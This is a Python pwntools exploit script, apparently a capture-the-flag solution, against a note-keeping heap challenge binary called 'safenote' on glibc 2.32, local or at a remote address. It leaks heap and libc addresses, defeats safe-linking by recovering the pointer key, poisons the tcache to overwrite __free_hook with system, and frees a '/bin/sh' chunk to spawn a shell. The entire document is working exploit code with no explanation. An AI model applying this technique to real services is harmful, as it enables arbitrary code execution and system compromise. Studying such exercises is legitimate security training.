from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './safenote'
HOST = '20.48.83.103'
PORT = 20004

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        # return process(TARGET)
        return process(["./ld-2.32.so", TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a(idx, size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    if size == 2:
        r.sendafter(': ', data)
        return
    else:
        r.sendlineafter(': ', data)

def s(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))

def m(src, dst):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(src))
    r.sendlineafter(': ', str(dst))

def c(src, dst):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', str(src))
    r.sendlineafter(': ', str(dst))



r = start()

for i in range(7):
    a(i, 0x70, 'A'*8)

m(1, 1)
m(0, 0)
for i in range(2, 7):
    m(i, 6)

s(0)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
s(1)
key = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
dbg('key')
heap = (leak ^ key) - 0x320
dbg('heap')
target = heap + 0x290

for i in range(3):
    a(2, 0x68, p64(0x21)*(0x60/8))
    a(3, 0x68, p64(0x21)*(0x60/8))

a(4, 0x18, p64(target ^ key))
c(4, 0)

for i in range(6):
    a(5, 0x70, 'AAAA')
a(5, 0x70, flat(0, 0x431+0x160))
m(0, 0)
s(0)
for i in range(10):
    a(5, 0x70, '')
a(5, 0x38, '')
a(5, 0x58, '')
s(2)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x1e3c40
fh = base + 0x1e6e40
system = base + 0x503c0

a(0, 0x38, 'A')
a(1, 0x38, 'A')
a(2, 0x38, 'A')
m(0, 0)
m(1, 1)
m(2, 2)

a(3, 10, p64((fh) ^ key))
m(3, 2)
a(1, 0x38, '/bin/sh\x00')
a(0, 0x38, p64(system))
if args.D:
    debug(r, [0x16a6])
m(1, 1)

r.interactive()
r.close()
